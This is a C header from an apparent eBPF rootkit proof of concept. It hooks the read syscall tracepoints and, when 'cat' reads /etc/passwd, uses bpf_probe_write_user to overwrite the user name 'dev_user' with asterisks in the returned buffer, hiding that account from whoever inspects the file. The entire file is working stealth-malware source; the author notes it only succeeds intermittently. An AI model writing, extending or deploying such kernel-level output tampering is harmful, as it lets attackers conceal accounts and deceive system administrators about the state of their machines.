/**
 * POC : trying to hook read returns based on dedicated files & overwrite values.
 * 
 * 
 * WARNING : 
 * 
 * Working not every time. I think it's a cache problem when passing through all 4 events.... I have to debug this....
 * ********:x:1111:1111::/home/********:/bin/bash
 * dev_user:x:1111:1111::/home/dev_user:/bin/bash
 * 
 * @author Yekuuun
 */

#ifndef MOD_HOOK_READ_H
#define MOD_HOOK_READ_H

#include "../includes/bpf_config.h"
#include "../includes/bpf_common.h"
#include "../includes/bpf_structs.h"
#include "../includes/bpf_debug.h"
#include "../includes/bpf_events_handler.h"
#include "../data/bpf_events.h"
#include "../data/bpf_ringbuf.h"
#include "../lib/ftlib.h"

#define NEEDLE  "dev_user"
#define NLEN    (sizeof(NEEDLE) - 1)
#define OVERLAP (NLEN - 1)


//----------------------------------------------------
// ┌────────────────────────────────────┐
//  INNER CONTEXTS
// └────────────────────────────────────┘
//----------------------------------------------------

typedef struct read_loop_ctx {
    unsigned long read;
    char *ubuff;
    __u32 count;
} read_loop_ctx;

typedef struct scan_ctx {
	const char *buff;
	char *ubuff; 
	unsigned long uread; 
	__u32 to_read;
	__u32 matches; 
} scan_ctx;

/**
 * Raw byte scanner to find matching.
 */
static long __scan_byte(__u32 i, void *data)
{
	struct scan_ctx *sctx = (struct scan_ctx *)data;

	if (i + NLEN > sctx->to_read)
		return 1;

	bool match = true;

	#pragma unroll
	for (__u32 j = 0; j < NLEN; j++) {
		__u32 idx = (i + j) & (BUFF_READ - 1);
		if (sctx->buff[idx] != NEEDLE[j]) {
			match = false;
			break;
		}
	}

	if (match) {
		const char mask[] = "********";
		#pragma unroll
		for (__u32 m = 0; m < NLEN; m++) {
			char val = mask[m];
			bpf_probe_write_user(sctx->ubuff + sctx->uread + i + m, &val, 1);
		}

		sctx->matches++;
	}

	return 0;
}

/**
 * Main callback called by bpf_loop() when iterating througt the __user *buffer
 */
#define OVERLAP (NLEN - 1)

static long __read_user_buffer(__u32 index, void *data)
{
	struct read_loop_ctx *lctx = (struct read_loop_ctx *)data;
	if (!lctx)
		return 1;

	if (lctx->read >= lctx->count) {
		PRINT_DEBUG(" End of buff read.");
		return 1;
	}

	char buff[BUFF_READ] = {0};

	__u32 to_read = (__u32)lctx->count - lctx->read;
	if (to_read > BUFF_READ)
		to_read = BUFF_READ;

	if (bpf_probe_read_user(buff, to_read, lctx->ubuff + lctx->read) < 0) {
		PRINT_DEBUG("Error reading buffer at offset %lu\n", lctx->read);
		return 1;
	}

	struct scan_ctx sctx = {
		.buff = buff,
		.ubuff = lctx->ubuff,
		.uread = lctx->read,
		.to_read = to_read,
		.matches = 0,
	};

	bpf_loop(to_read, __scan_byte, &sctx, 0);

	if (sctx.matches > 0) {
		send_event(EVENT_TRIGGERED, "__x64_sys_read", "hook cat /etc/passwd & overwrite dev_user");
	}

	if (to_read == BUFF_READ && to_read > OVERLAP)
		lctx->read += (to_read - OVERLAP);
	else
		lctx->read += to_read;

	return 0;
}

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  SYSCALL HOOKS
// └────────────────────────────────────┘
//----------------------------------------------------


/**
 * Hook sys_enter_read.
 */
SEC("tp/syscalls/sys_enter_read")
int tp_sys_enter_read(struct sys_enter_read_ctx *ctx)
{
    if(!ctx)
        return 0;

    if(!__is_target_bin() || !__is_binary_cat())
        return 0;

    __u64 fd    = ctx->fd; 
    __u32 count = ctx->count;
    char *ubuff = ctx->buf;

    __u64 pid_tgid = bpf_get_current_pid_tgid(); //64 bits value returned.

    /**
     * key to retrieve correct openat "cat" call stored in previous sys_openat call. see mod_hook_open.h
     */
    struct fd_key key = {
        .fd = fd,
        .pid_tgid = pid_tgid
    };

    //build value.
    struct sys_enter_cached_val val = {
        .count = count,
        .fd    = fd,
        .ubuff_adr = ubuff
    };

    char* target = bpf_map_lookup_elem(&fd_to_path_cache, &key);
    if(!target)
        return 0;

    if(bpf_probe_read_kernel_str(&val.path, MAX_PATH, target) < 0){
        PRINT_DEBUG("Error retrieving value from map cache.");
        return 0;
    }

    PRINT_DEBUG("  Found call for filepath : %s. Storing cache value for exit...", val.path);
    bpf_map_update_elem(&read_cache, &pid_tgid, &val, BPF_ANY);

    //clean.
    return 0;
}

/**
 * Hook sys_exit_read.
 */
SEC("tp/syscalls/sys_exit_read")
int tp_sys_exit_read(struct sys_exit_read_ctx *ctx)
{
    if(!ctx)
        return 0;

    if(!__is_target_bin() || !__is_binary_cat())
        return 0;

    __u64 pid_tgid = bpf_get_current_pid_tgid(); //64 bits value returned.

    __u64 *val = bpf_map_lookup_elem(&read_cache, &pid_tgid);
    if(!val)
        return 0; //silence.

    //convert to valid ptr.
    struct sys_enter_cached_val *cache = bpf_map_lookup_elem(&read_cache, &pid_tgid);
    if(!cache)
        return 0; //silence.

    __u64 fd    = cache->fd;
    __u32 count = cache->count;

    PRINT_DEBUG("   Entry of sys_exit_read => resolved fd => %ld", fd);

    //only keep passwd for testing.
    if(ft_strstr(cache->path, "passwd") == NULL){
        PRINT_DEBUG("   NOT /etc/passwd ???? WHUUUUUUUUUUUT");
        goto __END;
    }

    long actual_read = ctx->ret;
    if (actual_read <= 0)
        goto __END;

    struct read_loop_ctx lctx = {
        .count = (__u32)actual_read,
        .read  = 0,
        .ubuff = cache->ubuff_adr
    };

    long nr_completed = bpf_loop(MAX_ITER_LOOP, __read_user_buffer, &lctx, 0);

__END: 
    PRINT_DEBUG("   Cleaning maps...");
    bpf_map_delete_elem(&read_cache, &pid_tgid);

    return 0;
}

#endif